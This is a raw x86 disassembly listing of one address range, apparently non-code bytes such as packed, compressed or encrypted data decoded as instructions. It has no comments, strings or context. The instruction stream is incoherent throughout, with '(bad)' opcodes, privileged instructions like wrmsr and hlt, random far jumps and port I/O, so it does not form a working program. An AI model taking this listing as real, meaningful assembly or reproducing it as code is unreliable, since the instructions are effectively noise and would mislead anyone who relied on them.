  42261c:	pusha  
  42261d:	inc    esi
  42261e:	cmp    dh,bl
  422620:	push   cs
  422621:	push   ds
  422622:	pop    ecx
  422623:	jae    0x4225c3
  422625:	dec    esi
  422626:	repnz popf 
  422628:	inc    esp
  422629:	dec    DWORD PTR [esi+edx*2-0x2c]
  42262d:	pop    ebx
  42262e:	fdiv   st,st(4)
  422630:	mov    eax,0x524876e9
  422635:	mov    ch,0xe0
  422637:	das    
  422638:	adc    al,BYTE PTR [esi+0x21f1a040]
  42263e:	jmp    0x4226bd
  422640:	jp     0x4226a9
  422642:	das    
  422643:	sahf   
  422644:	int    0x80
  422646:	add    DWORD PTR [esp+ecx*4-0x2e],edx
  42264a:	fistp  WORD PTR [eax+0x702a8e5d]
  422650:	cli    
  422651:	fmul   DWORD PTR [ebx]
  422653:	or     dl,BYTE PTR [eax+ecx*2-0xec3b535]
  42265a:	cmp    bl,BYTE PTR [edx-0x4e8f7e56]
  422660:	xchg   ecx,eax
  422661:	sti    
  422662:	out    0x99,eax
  422664:	test   al,0xc5
  422666:	in     eax,0x96
  422668:	dec    esp
  422669:	scas   al,BYTE PTR es:[edi]
  42266a:	dec    ebp
  42266b:	push   eax
  42266c:	sahf   
  42266d:	enter  0x9d17,0x26
  422671:	cmp    ebp,DWORD PTR [ecx]
  422673:	jmp    FWORD PTR [edx]
  422675:	push   ebx
  422676:	or     cl,bl
  422678:	mov    eax,ds:0xce0e99a3
  42267d:	lods   eax,DWORD PTR ds:[esi]
  42267e:	or     esp,DWORD PTR [ebp-0x7]
  422681:	sbb    edi,esp
  422683:	inc    esi
  422684:	cld    
  422685:	js     0x422667
  422687:	sbb    dh,ch
  422689:	jnp    0x4226ce
  42268b:	push   es
  42268c:	lahf   
  42268d:	push   ss
  42268e:	add    BYTE PTR [ebp-0x3e3160c3],cl
  422694:	jmp    0x3fe3094b
  422699:	fucomp st(6)
  42269b:	imul   eax,esi,0x3176d9f0
  4226a1:	inc    eax
  4226a2:	pop    ebx
  4226a3:	ins    DWORD PTR es:[edi],dx
  4226a4:	xchg   esi,eax
  4226a5:	je     0x422638
  4226a7:	aaa    
  4226a8:	lods   eax,DWORD PTR ds:[esi]
  4226a9:	pusha  
  4226aa:	push   cs
  4226ab:	hlt    
  4226ac:	mov    edi,0x8eda6b75
  4226b1:	or     bh,ch
  4226b3:	in     eax,dx
  4226b4:	jae    0x422735
  4226b6:	xchg   edx,eax
  4226b7:	inc    eax
  4226b8:	gs scas eax,DWORD PTR es:[edi]
  4226ba:	jmp    0x42f8:0xbd7fb8b4
  4226c1:	push   es
  4226c2:	sahf   
  4226c3:	test   ebx,ebp
  4226c5:	(bad)  
  4226c6:	fucom  st(5)
  4226c8:	out    dx,eax
  4226c9:	xchg   ecx,eax
  4226ca:	adc    DWORD PTR [ecx-0x14f7e04e],ebx
  4226d0:	outs   dx,BYTE PTR ds:[esi]
  4226d1:	sub    BYTE PTR [eax],0x86
  4226d4:	jmp    0x71d6:0x6f6c1261
  4226db:	inc    esp
  4226dc:	lock mov DWORD PTR [ebp-0x4b],ecx
  4226e0:	mov    dh,0xce
  4226e2:	stos   DWORD PTR es:[edi],eax
  4226e3:	scas   eax,DWORD PTR es:[edi]
  4226e4:	push   ss
  4226e5:	pop    es
  4226e6:	sbb    al,0xa6
  4226e8:	(bad)  
  4226e9:	loopne 0x4226ba
  4226eb:	xor    DWORD PTR [ecx],0x3
  4226ee:	jo     0x42267e
  4226f0:	or     eax,0x9810915e
  4226f5:	int    0x7
  4226f7:	mov    edi,0xf6e7ac0c
  4226fc:	mov    esi,0x6b0f8a75
  422701:	mov    eax,ds:0xd6d46b4b
  422706:	add    eax,esi
  422708:	and    dl,BYTE PTR [ecx-0x1fbb2266]
  42270e:	sbb    dl,BYTE PTR [esi+0xf5]
	...
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x4e7f01c8
  422781:	outs   dx,DWORD PTR ds:[esi]
  422782:	retf   0xe367
  422785:	outs   dx,DWORD PTR ds:[esi]
  422786:	add    DWORD PTR [eax],eax
  422788:	add    eax,0x2c000001
  42278d:	mov    bl,0xaa
  42278f:	shr    ebp,0x5
  422792:	call   0x6d20:0xb0d4f164
  422799:	xchg   DWORD PTR ds:0x9eb4b02c,ecx
  42279f:	out    0x8,al
  4227a1:	retf   
  4227a2:	pop    esi
  4227a3:	clc    
  4227a4:	cdq    
  4227a5:	fwait
  4227a6:	int    0x72
  4227a8:	rcr    bl,cl
  4227aa:	cmp    BYTE PTR [ebx+eax*1+0x50],dl
  4227ae:	inc    ebp
  4227af:	xchg   BYTE PTR [esi],bl
  4227b1:	mov    eax,ds:0xab8649b1
  4227b6:	shr    DWORD PTR [ecx],1
  4227b8:	(bad)  
  4227ba:	cmp    eax,0x3a42ede3
  4227bf:	lods   al,BYTE PTR ds:[esi]
  4227c0:	es pop ds
  4227c2:	sti    
  4227c3:	stos   BYTE PTR es:[edi],al
  4227c4:	inc    ebp
  4227c5:	mov    ds:0xde3c923,eax
  4227ca:	mov    eax,DWORD PTR [ebp+0x6b]
  4227cd:	mov    dh,0xf6
  4227cf:	add    DWORD PTR ds:0xea8c04e3,esp
  4227d5:	mov    ds:0x49e1df1c,eax
  4227da:	aam    0xeb
  4227dc:	loopne 0x42284f
  4227de:	xor    al,0x88
  4227e0:	jmp    0x5d6ab3c7
  4227e5:	daa    
  4227e6:	jne    0x422840
  4227e8:	ud0    esi,DWORD PTR [ecx+ebx*2]
  4227ec:	adc    DWORD PTR [ebp-0x18],edi
  4227ef:	loopne 0x4227e7
  4227f1:	dec    edi
  4227f2:	or     eax,0xbdf9730
  4227f7:	pop    es
  4227f8:	xchg   esi,eax
  4227f9:	stc    
  4227fa:	mov    esi,0x96da0b2b
  4227ff:	nop
  422800:	dec    ebp
  422801:	ret    0x5eb2
  422804:	xchg   edi,eax
  422805:	ja     0x4227f7
  422807:	in     eax,dx
  422808:	pushf  
  422809:	aam    0x54
  42280b:	inc    esi
  42280c:	mov    BYTE PTR [ecx],dl
  42280e:	pop    ds
  42280f:	dec    esp
  422810:	loopne 0x422805
  422812:	or     bh,BYTE PTR [edi+0x736f76e4]
  422818:	mov    dl,0xd0
  42281a:	mov    bl,0x8c
  42281c:	sub    al,0xb7
  42281e:	mov    ebx,0xb0182e89
  422823:	icebp  
  422824:	push   eax
  422825:	add    bh,BYTE PTR [eax-0x29228be]
  42282b:	test   al,0xa6
  42282d:	shr    BYTE PTR [edi],1
  42282f:	and    edi,ebp
  422831:	pop    ecx
  422832:	aad    0x97
  422834:	aaa    
  422835:	lods   eax,DWORD PTR ds:[esi]
  422836:	or     DWORD PTR [ecx+esi*4],ecx
  422839:	jp     0x4228ba
  42283b:	(bad)  
  42283c:	mov    DWORD PTR [ecx+0x3],0x17777d60
  422843:	loope  0x422849
  422845:	lods   eax,DWORD PTR ds:[esi]
  422846:	(bad)
  422849:	adc    eax,0xbaf41b4a
  42284e:	and    al,0x75
  422850:	inc    ecx
  422851:	xor    BYTE PTR [ecx+0x15],dl
  422854:	sbb    al,0xe4
  422856:	mov    esp,0x3e4bfc95
  42285b:	add    al,0xd4
  42285d:	lods   al,BYTE PTR ds:[esi]
  42285e:	jb     0x422845
  422860:	fwait
  422861:	jbe    0x4227f2
  422863:	repnz pop edx
  422865:	push   ds
  422866:	pop    ss
  422867:	and    BYTE PTR [edx+0x3a],ah
  42286a:	test   BYTE PTR [eax+0x1f53b26d],dh
  422870:	or     edx,ecx
  422872:	fiadd  DWORD PTR [ecx-0x1c9cb18d]
  422878:	xchg   DWORD PTR [esi-0x36],edi
  42287b:	mov    eax,0x62c03274
  422880:	cmp    al,0xfc
  422882:	push   edi
  422883:	aas    
  422884:	sbb    al,BYTE PTR [edx+0x43]
  422887:	xchg   esi,eax
  422888:	fbld   TBYTE PTR ds:0xeac51086
  42288e:	push   ecx
  42288f:	mov    ebp,0x55
	...
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422909
  422901:	out    dx,eax
  422902:	or     ebx,DWORD PTR [edi+0x170e8]
  422908:	add    eax,0x99000001
  42290d:	push   ds
  42290e:	dec    edx
  42290f:	mov    esp,0xd1751720
  422914:	xchg   edx,eax
  422915:	or     al,BYTE PTR [edx-0x650e1d9e]
  42291b:	mul    BYTE PTR [eax+0x27]
  42291e:	bound  ecx,QWORD PTR [eax+eax*2-0x5d]
  422922:	mov    edx,0xd993edb1
  422927:	dec    edi
  422928:	mov    ah,0xb3
  42292a:	mov    al,ds:0xc0db7edf
  42292f:	test   ecx,esi
  422931:	sahf   
  422932:	sbb    al,0x97
  422934:	popa   
  422935:	add    al,0xe7
  422937:	and    BYTE PTR [ebx],0x26
  42293a:	rol    bh,1
  42293c:	stc    
  42293d:	push   es
  42293e:	fcomp  DWORD PTR [edx-0x69a4d657]
  422944:	mov    edi,0xfe39e83f
  422949:	adc    eax,esp
  42294b:	ins    DWORD PTR es:[edi],dx
  42294c:	or     bl,dh
  42294e:	cmc    
  42294f:	ret    
  422950:	shl    DWORD PTR [edx],1
  422952:	lea    esi,[ebx-0x80]
  422955:	test   eax,0x1443b88e
  42295a:	leave  
  42295b:	jg     0x422975
  42295d:	inc    esi
  42295e:	icebp  
  42295f:	into   
  422960:	inc    edx
  422961:	cmp    dl,BYTE PTR [edx+0x6a37aca1]
  422967:	scas   eax,DWORD PTR es:[edi]
  422968:	push   esi
  422969:	and    al,0xe5
  42296b:	mov    eax,0x45cb7fcf
  422970:	jl     0x4229d8
  422972:	mov    ebx,gs
  422974:	dec    ebx
  422975:	loopne 0x422920
  422977:	push   ebx
  422978:	in     al,0x67
  42297a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42297b:	neg    ebx
  42297d:	cmp    ah,BYTE PTR [edi]
  42297f:	ret    0xac2c
  422982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422983:	(bad)  
  422984:	hlt    
  422985:	add    al,0x99
  422987:	cli    
  422988:	xchg   edi,eax
  422989:	push   ss
  42298a:	stos   DWORD PTR es:[edi],eax
  42298b:	fist   DWORD PTR [eax-0x32]
  42298e:	cmp    DWORD PTR [edx-0x58],0x79
  422992:	dec    esi
  422993:	hlt    
  422994:	mov    edi,0x490c2558
  422999:	lds    ebp,FWORD PTR [edi]
  42299b:	jg     0x42299b
  42299d:	or     BYTE PTR [eax-0x32],0xab
  4229a1:	sbb    al,0xa8
  4229a3:	pop    ds
  4229a4:	ds cmp eax,0x2daca2c0
  4229aa:	push   ss
  4229ab:	dec    edi
  4229ac:	lea    esi,[esp+eiz*8]
  4229af:	sub    al,0x86
  4229b1:	pop    ebx
  4229b2:	int3   
  4229b3:	addr16 xor al,0x48
  4229b6:	popa   
  4229b7:	sbb    ebp,DWORD PTR [ebx+0x5f047166]
  4229bd:	mov    dl,BYTE PTR [ebp+0x3fa665eb]
  4229c3:	(bad)  
  4229c4:	das    
  4229c5:	ds fwait
  4229c7:	cmc    
  4229c8:	or     ebx,DWORD PTR [ecx+0x2f]
  4229cb:	stc    
  4229cc:	fadd   st(4),st
  4229ce:	stos   BYTE PTR es:[edi],al
  4229cf:	popa   
  4229d0:	dec    ebx
  4229d1:	call   0x8a5e780c
  4229d6:	gs ins DWORD PTR es:[edi],dx
  4229d8:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229da:	in     eax,0xfb
  4229dc:	mov    ch,0x35
  4229de:	xor    al,bl
  4229e0:	add    eax,0x9a129eac
  4229e5:	rcl    ecx,cl
  4229e7:	fnsave [esi]
  4229e9:	mov    ecx,0xab952b29
  4229ee:	out    0x57,al
  4229f0:	mov    edi,0x938b074c
  4229f5:	dec    edx
  4229f6:	loop   0x4229bb
  4229f8:	sti    
  4229f9:	xchg   edx,eax
  4229fa:	add    BYTE PTR [esp+ebx*1],dl
  4229fd:	pusha  
  4229fe:	repnz cwde 
  422a00:	test   DWORD PTR [esi],edi
  422a02:	stc    
  422a03:	scas   al,BYTE PTR es:[edi]
  422a04:	pop    esi
  422a05:	sbb    dh,al
  422a07:	sub    DWORD PTR [ecx],0xffffff8a
  422a0a:	aas    
  422a0b:	fs and edx,eax
  422a0e:	repnz push 0xba
	...
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	adc    esi,esi
  422a82:	div    BYTE PTR [edx-0x13]
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR ds:0x79000001,al
  422a8d:	in     eax,dx
  422a8e:	mov    dl,BYTE PTR [esi-0x4c]
  422a91:	(bad)  
  422a92:	push   cs
  422a93:	jle    0x422a49
  422a95:	aas    
  422a96:	(bad)  
  422a98:	cmp    ecx,DWORD PTR [eiz*4-0x50e944f6]
  422a9f:	arpl   di,cx
  422aa1:	dec    ebp
  422aa2:	xadd   BYTE PTR [ecx+eiz*1],dh
  422aa6:	out    0xee,eax
  422aa8:	lea    ebp,[edi]
  422aaa:	mov    ds:0xdbd25efd,al
  422aaf:	sbb    al,0x2e
  422ab1:	cld    
  422ab2:	scas   eax,DWORD PTR es:[edi]
  422ab3:	adc    ch,BYTE PTR [edi-0x10469563]
  422ab9:	or     ebx,edi
  422abb:	rol    BYTE PTR [edi+0x682f8e3],1
  422ac1:	jbe    0x422aa5
  422ac3:	enter  0xb7fd,0x4a
  422ac7:	mov    ds,WORD PTR [eax-0x2720fce9]
  422acd:	pop    eax
  422ace:	aam    0xed
  422ad0:	xlat   BYTE PTR ds:[ebx]
  422ad1:	mov    eax,ds:0xfe5c26af
  422ad6:	mov    eax,0xba51aac2
  422adb:	adc    esp,DWORD PTR [ecx-0x66]
  422ade:	or     DWORD PTR [ecx-0x1fd6e8a9],0xffffffc0
  422ae5:	in     al,dx
  422ae6:	push   es
  422ae7:	sahf   
  422ae8:	shr    DWORD PTR [ebx+0x575ef58c],0x45
  422aef:	push   edi
  422af0:	(bad)  [edi]
  422af2:	js     0x422ab0
  422af4:	mov    dl,0xa5
  422af6:	int    0xad
  422af8:	xor    al,0x3e
  422afa:	retf   0x6045
  422afd:	mov    ds:0xc9b998d4,eax
  422b02:	in     al,0xf
  422b04:	call   0xdb02ae4e
  422b09:	adc    BYTE PTR [edi+0x64cd233d],0x96
  422b10:	cmp    al,0x33
  422b12:	cs inc edx
  422b14:	fnstenv [eax-0x62909b20]
  422b1a:	ss or  ah,bh
  422b1d:	jns    0x422ad3
  422b1f:	push   edx
  422b20:	pop    eax
  422b21:	mov    esi,0x765813
  422b26:	add    esp,esp
  422b28:	xchg   ebp,eax
  422b29:	push   edx
  422b2a:	fcmove st,st(4)
  422b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b2d:	cli    
  422b2e:	push   ebp
  422b2f:	xor    ch,BYTE PTR [edi]
  422b31:	xchg   DWORD PTR [eax],eax
  422b33:	or     BYTE PTR [eax+0x2a],al
  422b36:	pop    edx
  422b37:	wrmsr  
  422b39:	popf   
  422b3a:	cmp    bl,BYTE PTR [edx-0x62]
  422b3d:	adc    al,0xe8
  422b3f:	pop    esp
  422b40:	mov    al,ds:0xd6171c24
  422b45:	push   edx
  422b46:	pop    es
  422b47:	cld    
  422b48:	sub    BYTE PTR ds:0xce81c3cc,ah
  422b4e:	and    bl,BYTE PTR [ebp-0x2fe6828f]
  422b54:	sub    al,0x23
  422b56:	jmp    0x422b78
  422b58:	int3   
  422b59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b5a:	xchg   esi,eax
  422b5b:	stc    
  422b5c:	sti    
  422b5d:	mov    bl,0xb6
  422b5f:	outs   dx,DWORD PTR ds:[esi]
  422b60:	fidivr WORD PTR [eax-0x32]
  422b63:	sbb    bl,cl
  422b65:	int    0x7b
  422b67:	retf   
  422b68:	(bad)  [edi+0x5e0435c8]
  422b6e:	inc    ebx
  422b6f:	sub    al,BYTE PTR [edi-0x68605bda]
  422b75:	xchg   ebx,eax
  422b76:	int3   
  422b77:	adc    ebp,edi
  422b79:	pop    edi
  422b7a:	pop    es
  422b7b:	les    ebp,FWORD PTR [esi+0x6434dfda]
  422b81:	adc    edx,DWORD PTR [ebx-0x1d]
  422b84:	sub    eax,0x4c8db5d1
  422b89:	leave  
  422b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b8b:	int3   
  422b8c:	xchg   ebp,eax
  422b8d:	push   edi
  422b8e:	cmp    al,0x2d
  422b90:	mov    BYTE PTR [eax],al
	...
  422bf2:	add    BYTE PTR [eax],al
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x2336b264]
  422c02:	gs adc al,0xf2
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR ds:0xa9000001,al
  422c0d:	outs   dx,BYTE PTR ds:[esi]
  422c0e:	mov    edi,0x72e34c48
  422c13:	or     ch,BYTE PTR [esp+eax*2-0x7]
  422c17:	cwde   
  422c18:	popf   
  422c19:	imul   ebp,ecx,0x4a8d4c01
  422c1f:	mov    edi,0xb3d97db1
  422c24:	cwde   
  422c25:	push   es
  422c26:	data16 and bl,BYTE PTR [ebx+0x157ef629]
  422c2d:	mov    ecx,0x668f15fc
  422c32:	gs gs icebp 
  422c35:	cdq    
  422c36:	ret    
  422c37:	mov    edx,0x7db12f72
  422c3c:	add    ah,BYTE PTR [esi-0x6a82d2b9]
  422c42:	lods   eax,DWORD PTR ds:[esi]
  422c43:	mov    BYTE PTR [esi-0x2e8741a8],al
  422c49:	inc    ecx
  422c4a:	popf   
  422c4b:	fdivr  st,st(3)
  422c4d:	or     cl,0xe
  422c50:	aad    0x75
  422c52:	mov    bh,BYTE PTR [ecx]
  422c54:	cli    
  422c55:	xor    cl,BYTE PTR [ebx-0x29]
  422c58:	dec    esi
  422c59:	xchg   DWORD PTR [edx],esi
  422c5b:	das    
  422c5c:	mov    ?,WORD PTR [eax-0x50]
  422c5f:	mov    ch,0x84
  422c61:	mov    DWORD PTR [ebx],eax
  422c63:	rol    DWORD PTR [edi],cl
  422c65:	sbb    eax,DWORD PTR [eax+0x76]
  422c68:	lock mov ds:0x90e7d88c,eax
  422c6e:	dec    ecx
  422c6f:	adc    al,0x8c
  422c71:	hlt    
  422c72:	and    al,0x45
  422c74:	and    al,BYTE PTR [ecx]
  422c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c77:	sbb    BYTE PTR [eax],cl
  422c79:	cmp    bl,BYTE PTR [edi+0x5f4dce3f]
  422c7f:	pusha  
  422c80:	push   esp
  422c81:	mov    edi,0x4655a5e9
  422c86:	cmp    DWORD PTR [esi],esp
  422c88:	imul   edx,DWORD PTR [eax],0xffffffc4
  422c8b:	repnz popa 
  422c8d:	fsubr  DWORD PTR [edx+0x28c5ccd0]
  422c93:	out    0x6,al
  422c95:	shr    DWORD PTR [eax+0x9],0x85
  422c99:	cwde   
  422c9a:	mov    bl,0xf
  422c9c:	and    al,BYTE PTR [edi-0x43]
  422c9f:	std    
  422ca0:	pop    eax
  422ca1:	mov    al,ds:0xd1f80e69
  422ca6:	stos   DWORD PTR es:[edi],eax
  422ca7:	push   ebx
  422ca8:	mov    bl,0x2d
  422caa:	repz and ebx,DWORD PTR [edx-0x42a7f691]
  422cb1:	fwait
  422cb2:	es pop ebx
  422cb4:	cmp    ebx,edx
  422cb6:	jmp    0x1088d164
  422cbb:	inc    esi
  422cbc:	push   es
  422cbd:	aad    0x5a
  422cbf:	cmp    BYTE PTR ds:0x57b7d6fc,bl
  422cc5:	dec    esp
  422cc6:	mov    eax,0xca6f09cc
  422ccb:	pushf  
  422ccc:	jmp    0x9466:0x4f67d445
  422cd3:	aad    0xd4
  422cd5:	xor    al,0x15
  422cd7:	outs   dx,DWORD PTR ds:[esi]
  422cd8:	adc    eax,0xc0dac974
  422cdd:	fwait
  422cde:	pop    ds
  422cdf:	xchg   ecx,ecx
  422ce1:	mov    ds:0xb50edc14,eax
  422ce6:	or     ch,BYTE PTR [ecx-0x5a]
  422ce9:	mov    dl,0x61
  422ceb:	shr    BYTE PTR [eax-0x6c],0x5a
  422cef:	call   0x2f0d:0x49ffe442
  422cf6:	mov    dl,0x28
  422cf8:	cmp    eax,0x6e43686e
  422cfd:	jmp    0x422d46
  422cff:	cmp    esi,0xffffffa4
  422d02:	loopne 0x422d68
  422d04:	and    al,0x7d
  422d06:	mov    edx,0x87cfdb8b
  422d0b:	xor    dh,BYTE PTR [ebx]
  422d0d:	imul   ecx,DWORD PTR [eax],0x29
  422d10:	adc    al,BYTE PTR [eax]
	...
  422d72:	add    BYTE PTR [eax],al
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    ebx,DWORD PTR [edx+eiz*8]
  422d82:	stos   DWORD PTR es:[edi],eax
  422d83:	lock div DWORD PTR [ebx+0x1]
  422d87:	add    BYTE PTR ds:0xc5000001,al
  422d8d:	lods   al,BYTE PTR ds:[si]
  422d8f:	aas    
  422d90:	shl    BYTE PTR [ebp+edx*8-0x4f6f6997],0xc2
  422d98:	push   edi
  422d99:	in     eax,dx
  422d9a:	jge    0x422d78
  422d9c:	hlt    
  422d9d:	sub    eax,DWORD PTR [ecx-0x36]
  422da0:	scas   al,BYTE PTR es:[edi]
  422da1:	mov    BYTE PTR [eax+0x11],0xfc
  422da5:	sbb    eax,0x902b5e5d
  422daa:	mov    edx,0x212050f3
  422daf:	outs   dx,DWORD PTR ds:[esi]
  422db0:	jnp    0x422dbe
  422db2:	ss stc 
  422db4:	and    eax,0x9816a34
  422db9:	or     bl,BYTE PTR fs:[eax-0x14]
  422dbd:	or     dl,cl
  422dbf:	lds    esi,FWORD PTR [esi-0x835fabb]
  422dc5:	pop    esp
  422dc6:	xor    cl,bh
  422dc8:	mov    ah,0xba
  422dca:	outs   dx,DWORD PTR ds:[esi]
  422dcb:	lahf   
  422dcc:	add    al,0x7d
  422dce:	pop    edi
  422dcf:	push   0xffffffc9
  422dd1:	pop    esp
  422dd2:	ss xchg di,ax
  422dd5:	push   0xffffffcc
  422dd7:	shr    ah,0xc4
  422dda:	jne    0x422dd6
  422ddc:	mov    bh,0xce
  422dde:	adc    bl,dl
  422de0:	push   edx
  422de1:	dec    ecx
  422de2:	arpl   WORD PTR [edx-0x2a],si
  422de5:	sub    BYTE PTR [esi-0x3cc4da3f],cl
  422deb:	or     eax,0xed94fbc2
  422df0:	out    dx,al
  422df1:	xchg   ebp,eax
  422df2:	fld1   
  422df4:	push   eax
  422df5:	inc    esi
  422df6:	popa   
  422df7:	mov    bh,0x7d
  422df9:	mov    WORD PTR [ebx+0x2b6f990b],es
  422dff:	fldcw  WORD PTR [eax]
  422e01:	fcmovu st,st(5)
  422e03:	lock fsub DWORD PTR ds:0xe29f6b08
  422e0a:	push   0x103f87fc
  422e0f:	dec    edx
  422e10:	mov    ah,BYTE PTR [ecx-0xd]
  422e13:	mov    al,ds:0x547889cb
  422e18:	mov    WORD PTR [edx+0x3cf249a8],es
  422e1e:	outs   dx,DWORD PTR ds:[esi]
  422e1f:	sbb    dl,BYTE PTR [ebp+0x1df1bd2b]
  422e25:	fcom   st(4)
  422e27:	ror    BYTE PTR [edx-0x46b7d4f7],1
  422e2d:	push   ebp
  422e2e:	and    al,0x4
  422e30:	and    eax,0xed9272a9
  422e35:	in     al,dx
  422e36:	and    ah,BYTE PTR ds:0x1c1c934d
  422e3c:	push   esp
  422e3d:	sbb    BYTE PTR [ecx],ch
  422e3f:	add    eax,0xb685a4e5
  422e44:	or     al,BYTE PTR [ebx+0x14e2443c]
  422e4a:	xlat   BYTE PTR ds:[ebx]
  422e4b:	fs dec ecx
  422e4d:	imul   ch
  422e4f:	aas    
  422e50:	jbe    0x422de5
  422e52:	pop    ebx
  422e53:	jp     0x52d61482
  422e59:	in     eax,dx
  422e5a:	jl     0x422def
  422e5c:	enter  0xa3d6,0x37
  422e60:	sti    
  422e61:	pop    ebx
  422e62:	nop
  422e63:	stos   DWORD PTR es:[edi],eax
  422e64:	pop    edi
  422e65:	mov    BYTE PTR [edi+0x97f9881],0xbd
  422e6c:	hlt    
  422e6d:	dec    edi
  422e6e:	mov    ecx,0xcfffd10
  422e73:	retf   0xdc04
  422e76:	sbb    edx,DWORD PTR [ebx+ecx*8+0x6e975638]
  422e7d:	dec    esp
  422e7e:	test   ah,cl
  422e80:	ss in  eax,dx
  422e82:	add    bl,BYTE PTR [eax]
  422e84:	and    al,0xfe
  422e86:	sub    esi,edi
  422e88:	out    0x24,al
  422e8a:	shl    esi,0x3c
  422e8d:	dec    edx
  422e8e:	adc    DWORD PTR [eax-0x63],esi
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0x8170
  422f02:	push   0xffffffc4
  422f04:	cld    
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0x5d000001,al
  422f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f0e:	sbb    eax,0xa76e1ffa
  422f13:	ds inc eax
  422f15:	push   ecx
  422f16:	test   eax,0x9cf4a585
  422f1b:	pop    esp
  422f1c:	push   edi
  422f1d:	cmc    
  422f1e:	popa   
  422f1f:	outs   dx,BYTE PTR ds:[esi]
  422f20:	push   ebp
  422f21:	mov    ds:0x70b32c1d,eax
  422f26:	adc    DWORD PTR [ebp+0x4e],esi
  422f29:	fwait
  422f2a:	aad    0xdf
  422f2c:	adc    DWORD PTR [ebx],esp
  422f2e:	(bad)  
  422f2f:	jb     0x422f60
  422f31:	xlat   BYTE PTR ds:[ebx]
  422f32:	pop    esi
  422f33:	xchg   ebx,eax
  422f34:	push   ebx
  422f35:	push   edx
  422f36:	leave  
  422f37:	inc    sp
  422f39:	adc    bl,BYTE PTR [ebx]
  422f3b:	pop    esp
  422f3c:	ins    BYTE PTR es:[edi],dx
  422f3d:	sbb    BYTE PTR [esi-0x7c],al
  422f40:	jmp    0x2f27:0xd96b3517
  422f47:	sub    ecx,DWORD PTR [ebp+0x35]
  422f4a:	mov    edi,DWORD PTR [ecx]
  422f4c:	into   
  422f4d:	mov    ah,0x82
  422f4f:	into   
  422f50:	mov    BYTE PTR [eax+esi*2-0x4ec6df34],bl
  422f57:	cmc    
  422f58:	shl    BYTE PTR [ebp+0x2e30477d],1
  422f5e:	push   ss
  422f5f:	adc    DWORD PTR [ecx-0x37],0x35f9a6fa
  422f66:	out    dx,eax
  422f67:	popf   
  422f68:	data16 loop 0x422f75
  422f6b:	xchg   BYTE PTR [ebp+0x24fbedfe],al
  422f71:	xchg   ebx,eax
  422f72:	inc    eax
  422f73:	pop    edi
  422f74:	hlt    
  422f75:	adc    al,BYTE PTR [eax+0xf7d2c1c]
  422f7b:	pop    eax
  422f7c:	test   eax,0x2b43132e
  422f81:	ud2    
  422f83:	and    al,0x2f
  422f85:	push   0xffffff8c
  422f87:	ret    0xd5ba
  422f8a:	fisttp DWORD PTR [edi-0x3a7ead26]
  422f90:	xor    DWORD PTR [edi-0x28],edi
  422f93:	icebp  
  422f94:	dec    edi
  422f95:	mov    ah,0x9b
  422f97:	lods   al,BYTE PTR ds:[esi]
  422f98:	and    BYTE PTR [esi],bl
  422f9a:	es test al,0x2f
  422f9d:	daa    
  422f9e:	adc    edx,edi
  422fa0:	xchg   ebp,eax
  422fa1:	sti    
  422fa2:	leave  
  422fa3:	stos   DWORD PTR es:[edi],eax
  422fa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fa5:	je     0x422fb4
  422fa7:	retf   0xc8f
  422faa:	jecxz  0x423005
  422fac:	int    0xe
  422fae:	out    dx,eax
  422faf:	cmp    ebx,ecx
  422fb1:	test   BYTE PTR [ebx+0x37],0x3a
  422fb5:	sbb    DWORD PTR [edi+eiz*2-0x49ccb070],ecx
  422fbc:	fxam   
  422fbe:	dec    esp
  422fbf:	std    
  422fc0:	mov    ss,ebp
  422fc2:	icebp  
  422fc3:	loopne 0x422f71
  422fc5:	sbb    ah,BYTE PTR [ebx-0x7d]
  422fc8:	inc    eax
  422fc9:	xchg   esi,eax
  422fca:	pop    esi
  422fcb:	js     0x422ffb
  422fcd:	or     edi,DWORD PTR [edx+0x1]
  422fd0:	loopne 0x422f6e
  422fd2:	loopne 0x423003
  422fd4:	out    0x85,eax
  422fd6:	inc    DWORD PTR [ecx-0x57afc448]
  422fdc:	jl     0x422fbc
  422fde:	pop    es
  422fdf:	mov    ds:0xb12401dc,eax
  422fe4:	xchg   esp,eax
  422fe5:	sub    dh,BYTE PTR [ebp-0x2]
  422fe8:	loope  0x422fd4
  422fea:	or     BYTE PTR [ebp-0x790dc66e],bl
  422ff0:	fsubr  st,st(6)
  422ff2:	sub    eax,0xaaf7127e
  422ff7:	outs   dx,BYTE PTR ds:[esi]
  422ff8:	sub    DWORD PTR [ebp-0x713d6c72],esi
  422ffe:	leave  
  422fff:	int    0xe3
  423001:	repz mov al,ds:0xcb1865b
  423007:	mov    esp,0x63114867
  42300c:	dec    DWORD PTR [ecx+0x113217]
	...
  423072:	add    BYTE PTR [eax],al
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
